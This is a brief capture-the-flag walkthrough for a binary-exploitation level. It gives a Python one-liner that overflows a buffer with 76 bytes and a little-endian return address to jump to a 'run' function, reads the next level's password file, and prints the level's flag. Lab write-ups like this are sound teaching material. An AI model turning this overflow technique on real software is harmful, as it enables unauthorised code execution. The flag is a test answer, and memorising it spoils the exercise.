# Level 1

We need to overflow input and then execute the 'run'
function. To get the 'run' function's address, we use `objdump -d level1`. The address must be converted to little endian because the machine's registers are in little endian.

```bash
python -c 'print "n" * 76 + "\x44\x84\x04\x08"' > /tmp/level1
cat /tmp/level1 - | ./level1
cat /home/user/level2/.pass
```

**Flag:** `53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77`
